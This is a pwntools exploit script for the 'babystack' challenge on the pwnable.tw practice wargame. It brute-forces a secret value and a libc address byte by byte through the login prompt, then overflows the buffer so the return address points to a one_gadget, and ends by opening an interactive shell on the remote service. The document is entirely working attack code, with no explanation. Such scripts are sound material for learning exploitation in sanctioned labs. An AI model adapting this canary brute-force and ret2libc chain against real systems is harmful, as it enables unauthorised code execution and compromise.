#!/usr/bin/env python3

from pwn import *

exe = ELF("./babystack_patched")
libc = ELF("./libc_64.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe


#p = process()
p = remote('chall.pwnable.tw', 10205)

#gdb.attach(p,gdbscript='''
#           brva 0x0000000000000E1E
 #          brva 0x0000000000000EBB
#           ''')
# login success
input()

def log_in():
    p.sendlineafter(b'>> ',b'1')
    p.sendafter(b'passowrd :',b'\x00')
def log_out():
    p.sendlineafter(b'>> ',b'1')

def bf():
    random_value = b''
    for i in range(16):
        p.sendlineafter(b'>>',b'1') #log out
        for j in range(1,256):
            p.sendlineafter(b'>>',b'1')
            random_value += p8(j)
            p.sendafter(b'Your passowrd :',random_value + b'\x00')
            if b'Login Success' in p.recvline():
                break
            else:
                random_value = random_value[:-1]
    return random_value
def bf_libc():
    libc_value = b''
    for i in range(14):
        p.sendlineafter(b'>>',b'1') #log out
        for j in range(1,256):
            p.sendlineafter(b'>>',b'1')
            libc_value += p8(j)
            p.sendafter(b'Your passowrd :',libc_value + b'\x00')
            if b'Login Success' in p.recvline():
                break
            else:
                libc_value = libc_value[:-1]
    return libc_value
log_in()
passowrd = bf()
print(passowrd.hex())

log_out()

p.sendlineafter(b'>> ',b'1')
p.sendafter(b'passowrd :',b'\x00' + b'b'*71)

p.sendlineafter(b'>> ',b'3')
p.sendafter(b'Copy :',b'a'*8)


libc_leak = bf_libc()
libc_leak = u64(libc_leak[8:].ljust(8,b'\x00'))
print(type(libc_leak))
log.info(f'libc: {hex(libc_leak)}')
libc.address = libc_leak - 0x78439
log.info(f'libc_address: {hex(libc.address)}')
one_gadget = [0x45216, 0x4526a, 0xef6c4, 0xf0567]
oneshot = libc.address + one_gadget[0]
log_out()
payload = flat(
        'a'*0x40,
        passowrd,
        'b'*0x18,
        oneshot
        )
p.sendlineafter(b'>>',b'1')
p.sendafter(b'passowrd :',payload)

log_in()
p.sendlineafter(b'>>',b'3')
p.sendafter(b'Copy :',b'a')

p.sendlineafter(b'>>',b'2')


p.interactive()
